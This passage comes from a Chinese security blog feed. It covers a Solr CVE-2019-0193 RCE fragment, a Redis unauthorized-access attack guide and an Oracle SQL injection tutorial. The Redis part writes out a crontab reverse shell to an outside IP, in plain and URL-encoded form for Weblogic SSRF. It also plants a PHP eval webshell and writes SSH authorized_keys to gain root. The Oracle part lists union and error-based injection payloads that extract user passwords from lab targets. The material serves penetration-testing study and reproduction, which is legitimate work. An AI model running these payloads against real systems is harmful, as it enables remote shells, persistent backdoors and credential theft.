class="symbol">%0</span>A++++++++++++transformer<span class="symbol">%3</span>D<span class="symbol">%22</span>script<span class="symbol">%3</span>Apoc<span class="symbol">%22</span>+<span class="symbol">%2</span>F<span class="symbol">%3</span>E<span class="symbol">%0</span>A++<span class="symbol">%3</span>C<span class="symbol">%2</span>Fdocument<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="symbol">%2</span>FdataConfig<span class="symbol">%3</span>E&amp;name=dataimport</span><br></pre></td></tr></table></figure>

<p>![222](Solr（CVE-2019-0193）远程命令执行漏洞复现/截屏2020-05-11 下午2.11.43.png)</p>
<p><img src="//choge.top/2020/07/26/Solr（CVE-2019-0193）远程命令执行漏洞复现/image-20200728092845431.png" alt="image-20200728092845431"></p>
<p>可以成功反弹shell</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis未授权访问总结</title>
    <url>/2020/07/26/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="Redis未授权访问总结"><a href="#Redis未授权访问总结" class="headerlink" title="Redis未授权访问总结"></a>Redis未授权访问总结</h2><p>本文主要总结Redis未授权访问漏洞</p><h3 id="结合Weblogic-ssrf攻击Redis（计划任务）"><a href="#结合Weblogic-ssrf攻击Redis（计划任务）" class="headerlink" title="结合Weblogic ssrf攻击Redis（计划任务）"></a>结合Weblogic ssrf攻击Redis（计划任务）</h3><p>开启Weblogic环境</p><p>docker映射7001和8088端口</p><p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728091436973.png" alt="image-20200728091436973"></p><p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728091503938.png" alt="image-20200728091503938"></p><p>点击如下功能</p><p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728091526319.png" alt="image-20200728091526319"></p><p>抓取数据包如下，提示服务存在</p><p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728091544876.png" alt="image-20200728091544876"></p><p>改变ip，报错，说明存在ssrf</p><p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728091605610.png" alt="image-20200728091605610"></p><p>docker开启redis，如此开启后redis与weblogic存在与同一网段</p><a id="more"></a>











<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728091631712.png" alt="image-20200728091631712"></p>
<p>查看redis内部IP地址</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728091652185.png" alt="image-20200728091652185"></p>
<p>通过Weblogic探测Redis，根据返回可知存在Redis</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092013118.png" alt="image-20200728092013118"></p>
<p>构造计划任务数据</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">test</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> 1 <span class="string">"\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.16.49.33/7777 0&gt;&amp;1\n\n\n\n"</span></span><br><span class="line">config <span class="builtin-name">set</span> dir /etc/</span><br><span class="line">config <span class="builtin-name">set</span> dbfilename crontab</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>

<p>编码后如下</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">test%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">201</span>%<span class="number">20</span>%<span class="number">22</span>%<span class="number">5</span>Cn%<span class="number">5</span>Cn%<span class="number">5</span>Cn%<span class="number">5</span>Cn*%<span class="number">20</span>*%<span class="number">20</span>*%<span class="number">20</span>*%<span class="number">20</span>*%<span class="number">20</span>root%<span class="number">20</span>bash%<span class="number">20</span>-i%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">26</span>%<span class="number">20</span>%<span class="number">2</span>Fdev%<span class="number">2</span>Ftcp%<span class="number">2</span>F172<span class="number">.16</span><span class="number">.49</span><span class="number">.33</span>%<span class="number">2</span>F7777%<span class="number">200</span>%<span class="number">3</span>E%<span class="number">261</span>%<span class="number">5</span>Cn%<span class="number">5</span>Cn%<span class="number">5</span>Cn%<span class="number">5</span>Cn%<span class="number">22</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">20</span>set%<span class="number">20</span>dir%<span class="number">20</span>%<span class="number">2</span>Fetc%<span class="number">2</span>F%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">20</span>set%<span class="number">20</span>dbfilename%<span class="number">20</span>crontab%<span class="number">0</span>D%<span class="number">0</span>Asave%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Aaaa</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092036039.png" alt="image-20200728092036039"></p>
<p>bp发送构造的数据包</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092101840.png" alt="image-20200728092101840"></p>
<p>vps设置监听后成功反弹shell</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092123544.png" alt="image-20200728092123544"></p>
<h3 id="未授权访问漏洞测试"><a href="#未授权访问漏洞测试" class="headerlink" title="未授权访问漏洞测试"></a>未授权访问漏洞测试</h3><p>一台开启redis的机器与ip为172.16.49.233进行交互</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">./redis-cli -h <span class="number">172.16</span><span class="number">.49</span><span class="number">.233</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092143439.png" alt="image-20200728092143439"></p>
<p>成功交互</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092218583.png" alt="image-20200728092218583"></p>
<h3 id="redis写webshell"><a href="#redis写webshell" class="headerlink" title="redis写webshell"></a>redis写webshell</h3><p>前提条件：</p>
<ul>
<li>靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</li>
<li>开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限 （我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a/b的任意文件</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">config <span class="builtin-name">set</span> dir /home/cc</span><br><span class="line">config <span class="builtin-name">set</span> dbfilename redis.php</span><br><span class="line"><span class="builtin-name">set</span> webshell <span class="string">"&lt;?php phpinfo(); ?&gt;"</span>   #此步也可以使用<span class="builtin-name">set</span> x <span class="string">"\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n"</span>  edis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>当数据库过大时，redis写shell的小技巧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">$fp=fopen(<span class="string">'bmjoker.php'</span>,<span class="string">'w'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'&lt;?php @eval($_POST[\"bmjoker\"]);?&gt;'</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="“公私钥”认证获取root权限"><a href="#“公私钥”认证获取root权限" class="headerlink" title="“公私钥”认证获取root权限"></a>“公私钥”认证获取root权限</h3><p>攻击机与靶机开启Redis服务</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092241128.png" alt="image-20200728092241128"></p>
<p>攻击机生成公私钥，密码为空</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092312357.png" alt="image-20200728092312357"></p>
<p>进入.ssh目录</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092337138.png" alt="image-20200728092337138"></p>
<p>将密码保存为fo.txt</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">(echo -e <span class="string">"<span class="subst">\n</span><span class="subst">\n</span>"</span>; cat id_rsa.pub; echo -e <span class="string">"<span class="subst">\n</span><span class="subst">\n</span>"</span>) &gt; fo.txt</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092401839.png" alt="image-20200728092401839"></p>
<p>拷贝redis-cli到/root/.ssh/下</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092426413.png" alt="image-20200728092426413"></p>
<p>靶机需要有.ssh目录，创建目录</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092445066.png" alt="image-20200728092445066"></p>
<p>将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092501783.png" alt="image-20200728092501783"></p>
<p>使用<code>redis-cli -h 172.16.49.78</code>远程登录靶机的redis服务，使用<code>config set dir</code>命令得到redis备份的路径：</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092523085.png" alt="image-20200728092523085"></p>
<p>使用<code>config set dir /root/.ssh</code>更改redis备份路径为ssh公钥存放目录，使用<code>config set dbfilename&quot;authorized_keys&quot;</code>设置上传公钥的备份文件名字为authorized_keys</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092542588.png" alt="image-20200728092542588"></p>
<p><code>config get dbfilename</code>检查是否更改成功（查看有没有authorized_keys文件）</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092603915.png" alt="image-20200728092603915"></p>
<p>保存和退出</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092622426.png" alt="image-20200728092622426"></p>
<p><code>ssh -i id_rsa root@172.16.49.78</code>在攻击机上使用ssh免密登录靶机</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092642782.png" alt="image-20200728092642782"></p>
<h3 id="POC脚本"><a href="#POC脚本" class="headerlink" title="POC脚本"></a>POC脚本</h3><p><a href="https://github.com/vulhub/redis-rogue-getshell" target="_blank" rel="noopener">https://github.com/vulhub/redis-rogue-getshell</a></p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092701497.png" alt="image-20200728092701497"></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 redis-master<span class="selector-class">.py</span> -r target-ip -<span class="selector-tag">p</span> <span class="number">6379</span> -L local-ip -P <span class="number">8888</span> -f RedisModulesSDK/exp<span class="selector-class">.so</span> -c <span class="string">"id"</span></span><br></pre></td></tr></table></figure>

<p>命令执行如下，成功执行id命令</p>
<p><img src="//choge.top/2020/07/26/Redis未授权访问总结/image-20200728092722167.png" alt="image-20200728092722167"></p>
<p>其他脚本</p>
<p><a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
<p><a href="https://github.com/Ridter/redis-rce" target="_blank" rel="noopener">https://github.com/Ridter/redis-rce</a></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/flokz/p/weblogic_SSRF.html" target="_blank" rel="noopener">https://www.cnblogs.com/flokz/p/weblogic_SSRF.html</a></p>
<p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p>
<p><a href="https://www.cnblogs.com/xiaozi/p/7568272.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/7568272.html</a></p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle数据库注入总结</title>
    <url>/2020/04/16/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>本文主要对oracle注入做总结，由于环境比价难搭建，文中会使用各种环境做测试。</p><h2 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h2><h3 id="Oracle权限分类"><a href="#Oracle权限分类" class="headerlink" title="Oracle权限分类"></a>Oracle权限分类</h3><h3 id="系统权限管理"><a href="#系统权限管理" class="headerlink" title="系统权限管理"></a>系统权限管理</h3><p>DBA、RESOURCE、CONNECT</p><h3 id="实体权限管理"><a href="#实体权限管理" class="headerlink" title="实体权限管理"></a>实体权限管理</h3><p>execute、ALL（select、update、insert、alert、index、delete）</p><h3 id="权限传递"><a href="#权限传递" class="headerlink" title="权限传递"></a>权限传递</h3><p>1.如果使用WITH ADMIN OPTION为某个用户授权系统权限，那么对于被这个用户授予相同权限的所有用户来说，取消该用户的系统权限并不会级联取消这些用户的相同权限。</p><a id="more"></a>



<p>2.系统权限无联级，即A授予B权限，B授予C权限，如果A收回B的权限，C的权限不受影响；系统权限可以跨越用户回收，即A可以直接回收C的权限</p>
<p>3.如果取消某个用户的对象权限，那么对于这个用户使用WITH GRANT OPTION授予权限的用户来说，同样还会取消这些用户的相同权限，也就是说取消授权是级联的。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Create<span class="built_in"> user </span>user100 identified by SYSTEM;</span><br><span class="line">great connect,<span class="built_in"> resource </span><span class="keyword">to</span> user100;</span><br><span class="line">select * <span class="keyword">from</span> dba_sys_privs where <span class="attribute">grantee</span>=<span class="string">'USER100'</span>;</span><br><span class="line">Revoke connect,<span class="built_in"> resource </span><span class="keyword">to</span> user100;</span><br><span class="line">select * <span class="keyword">from</span> dba_sys_privs where <span class="attribute">grantee</span>=<span class="string">'USER100'</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">user</span> user102 <span class="keyword">identified</span> <span class="keyword">by</span> <span class="keyword">SYSTEM</span>;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">select</span>, <span class="keyword">update</span> <span class="keyword">on</span> <span class="keyword">HELP</span> <span class="keyword">to</span> user102 <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;</span><br><span class="line"><span class="keyword">Revoke</span> <span class="keyword">select</span>, <span class="keyword">update</span> <span class="keyword">on</span> <span class="keyword">HELP</span> <span class="keyword">from</span> user102;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> dba_tab_privs <span class="keyword">where</span> grantee=<span class="string">'USER102'</span>;</span><br></pre></td></tr></table></figure>

<h2 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h2><p>1.Oracle使用查询语句注入时需跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select语法规则，Oracle保证dual里面永远只有一条记录。</p>
<p>2.Oracle的数据类型是强匹配进行类似union查询数据时必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。</p>
<p>3.Oracle的单行注释符号是–，多行注释符号是/**/。</p>
<h3 id="Oracle报错基础语法"><a href="#Oracle报错基础语法" class="headerlink" title="Oracle报错基础语法"></a>Oracle报错基础语法</h3><h4 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h4><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">' ordey <span class="keyword">by</span> <span class="number">3</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h4 id="判断回显位置"><a href="#判断回显位置" class="headerlink" title="判断回显位置"></a>判断回显位置</h4><figure class="highlight q"><table><tr><td class="code"><pre><span class="line">' <span class="built_in">union</span> <span class="keyword">select</span> <span class="built_in">null</span>,<span class="built_in">null</span>,<span class="built_in">null</span> <span class="keyword">from</span> dual --</span><br></pre></td></tr></table></figure>

<h4 id="获取数据库版本信息"><a href="#获取数据库版本信息" class="headerlink" title="获取数据库版本信息"></a>获取数据库版本信息</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="literal">null</span>,(<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$<span class="keyword">version</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>),<span class="literal">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>####获取数据表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="literal">null</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>),<span class="literal">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="literal">null</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span> <span class="keyword">and</span> table_name &lt;&gt; <span class="string">'T_USER'</span>),<span class="literal">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h4 id="获取关键表中的列名"><a href="#获取关键表中的列名" class="headerlink" title="获取关键表中的列名"></a>获取关键表中的列名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="literal">null</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab <span class="keyword">columns</span> <span class="keyword">where</span> table_name=<span class="string">'T_USER'</span> <span class="keyword">and</span> <span class="keyword">rownum</span>=<span class="number">1</span>),<span class="literal">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h4 id="Oracle注入实战"><a href="#Oracle注入实战" class="headerlink" title="Oracle注入实战"></a>Oracle注入实战</h4><p>环境：墨者学院</p>
<p>判断注入</p>
<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728085803803.png" alt="image-20200728085803803"></p>
<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728085829652.png" alt="image-20200728085829652"></p>
<p>确定列数</p>
<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090006739.png" alt="image-20200728090006739"></p>
<p>确定显示位</p>
<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090031971.png" alt="image-20200728090031971"></p>
<p>查看数据库版本</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:44218/new_list.php?id=1 union <span class="keyword">select</span> (<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$<span class="keyword">version</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>),<span class="literal">null</span> <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090102318.png" alt="image-20200728090102318"></p>
<p>查看数据表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:44218/new_list.php?id=1 union <span class="keyword">select</span> (<span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>),<span class="literal">null</span> <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090133634.png" alt="image-20200728090133634"></p>
<p>继续查看数据表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:44218/new_list.php?id=1 union <span class="keyword">select</span> (<span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span> <span class="keyword">and</span> table_name&lt;&gt;<span class="string">'LOGMNR_SESSION_EVOLVE$'</span>),<span class="literal">null</span> <span class="keyword">from</span> dual     <span class="comment">#&lt;&gt;相当于Mysql中的!=</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090201596.png" alt="image-20200728090201596"></p>
<p>继续查看数据表，只需在后面接<code>and table_name&lt;&gt;&#39;数据表&#39;</code>，直到查询到sns_users表</p>
<p>查看字段</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:49802/new_list.php?id=1 union <span class="keyword">select</span> (<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name=<span class="string">'sns_users'</span> <span class="keyword">and</span> <span class="keyword">rownum</span>=<span class="number">1</span>),<span class="literal">null</span> <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090230723.png" alt="image-20200728090230723"></p>
<p>继续查看字段</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:49802/new_list.php?id=1 union <span class="keyword">select</span> (<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name=<span class="string">'sns_users'</span> <span class="keyword">and</span> column_name&lt;&gt;<span class="string">'USER_NAME'</span> <span class="keyword">and</span> <span class="keyword">rownum</span>=<span class="number">1</span>),<span class="literal">null</span> <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090255068.png" alt="image-20200728090255068"></p>
<p>查看用户数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:49802/new_list.php?id=1 union <span class="keyword">select</span> (<span class="keyword">select</span> USER_NAME <span class="keyword">from</span> <span class="string">"sns_users"</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>),<span class="literal">null</span> <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090324060.png" alt="image-20200728090324060"></p>
<p>查看密码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:43767/new_list.php?id=1 union <span class="keyword">select</span> (<span class="keyword">select</span> USER_PWD <span class="keyword">from</span> <span class="string">"sns_users"</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>),<span class="literal">null</span> <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090347860.png" alt="image-20200728090347860"></p>
<p>此密码无法解密</p>
<p>继续查看其他用户</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:49802/new_list.php?id=1 union <span class="keyword">select</span> (<span class="keyword">select</span> USER_NAME <span class="keyword">from</span> <span class="string">"sns_users"</span> <span class="keyword">where</span> USER_NAME&lt;&gt;<span class="string">'zhong'</span> <span class="keyword">and</span> <span class="keyword">rownum</span>=<span class="number">1</span>),<span class="literal">null</span> <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090422855.png" alt="image-20200728090422855"></p>
<p>继续查看其他用户</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:43767/new_list.php?id=1 union <span class="keyword">select</span> (<span class="keyword">select</span> USER_NAME <span class="keyword">from</span> <span class="string">"sns_users"</span> <span class="keyword">where</span> USER_NAME&lt;&gt;<span class="string">'zhong'</span> <span class="keyword">and</span> USER_NAME&lt;&gt;<span class="string">'hu'</span> <span class="keyword">and</span> <span class="keyword">rownum</span>=<span class="number">1</span>),<span class="literal">null</span> <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090444194.png" alt="image-20200728090444194"></p>
<p>查看密码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:43767/new_list.php?id=1 union <span class="keyword">select</span> (<span class="keyword">select</span> USER_PWD <span class="keyword">from</span> <span class="string">"sns_users"</span> <span class="keyword">where</span> USER_NAME=<span class="string">'mozhe'</span> <span class="keyword">and</span> <span class="keyword">rownum</span>=<span class="number">1</span>),<span class="literal">null</span> <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090516888.png" alt="image-20200728090516888"></p>
<p>查询密码</p>
<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090539172.png" alt="image-20200728090539172"></p>
<p>成功登入</p>
<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090611064.png" alt="image-20200728090611064"></p>
<h3 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h3><h4 id="使用utl-inaddrget-host-name"><a href="#使用utl-inaddrget-host-name" class="headerlink" title="使用utl.inaddrget_host_name()"></a>使用utl.inaddrget_host_name()</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>==1' <span class="keyword">and</span> <span class="attribute">1</span>=utl_inaddr.get_host_name((select<span class="built_in"> user </span><span class="keyword">from</span> dual)) --</span><br></pre></td></tr></table></figure>

<h4 id="使用ctxsys-drithsx-sn"><a href="#使用ctxsys-drithsx-sn" class="headerlink" title="使用ctxsys.drithsx.sn()"></a>使用ctxsys.drithsx.sn()</h4><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>' <span class="keyword">and</span> <span class="number">1</span>=ctxsys.drithsx.sn(<span class="number">1</span>,(select <span class="keyword">user</span> <span class="title">from</span> dual)) --</span><br></pre></td></tr></table></figure>

<h4 id="使用XMLType-进行报错注入"><a href="#使用XMLType-进行报错注入" class="headerlink" title="使用XMLType()进行报错注入"></a>使用XMLType()进行报错注入</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1' and  (<span class="keyword">select</span> <span class="keyword">upper</span>(<span class="keyword">XMLType</span>(<span class="keyword">chr</span>(<span class="number">60</span>)||<span class="keyword">chr</span>(<span class="number">58</span>)||(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)||<span class="keyword">chr</span>(<span class="number">62</span>))) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h4 id="使用dbms-xdb-version-checkin-进行报错盲注"><a href="#使用dbms-xdb-version-checkin-进行报错盲注" class="headerlink" title="使用dbms_xdb_version.checkin()进行报错盲注"></a>使用dbms_xdb_version.checkin()进行报错盲注</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1' and  (<span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h4 id="使用dbms-xdb-version-makeversioned"><a href="#使用dbms-xdb-version-makeversioned" class="headerlink" title="使用dbms_xdb_version.makeversioned()"></a>使用dbms_xdb_version.makeversioned()</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1' and (<span class="keyword">select</span> dbms_xdb_version.makeversioned((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h4 id="使用dbms-xdb-version-uncheckout"><a href="#使用dbms-xdb-version-uncheckout" class="headerlink" title="使用dbms_xdb_version.uncheckout()"></a>使用dbms_xdb_version.uncheckout()</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1' and (<span class="keyword">select</span> dbms_xdb_version.uncheckout((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1' and (<span class="keyword">SELECT</span> dbms_utility.sqlid_to_sqlhash((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h4 id="报错注入实战"><a href="#报错注入实战" class="headerlink" title="报错注入实战"></a>报错注入实战</h4><p>环境：<a href="http://o1.lab.aqlab.cn:81/?id=1" target="_blank" rel="noopener">http://o1.lab.aqlab.cn:81/?id=1</a></p>
<p>判断注入</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://o<span class="number">1</span>.lab.aqlab.cn:<span class="number">81</span>/?id=<span class="number">1</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%201</span>=<span class="number">1</span></span><br><span class="line">http://o<span class="number">1</span>.lab.aqlab.cn:<span class="number">81</span>/?id=<span class="number">1</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%201</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>查看数据表</p>
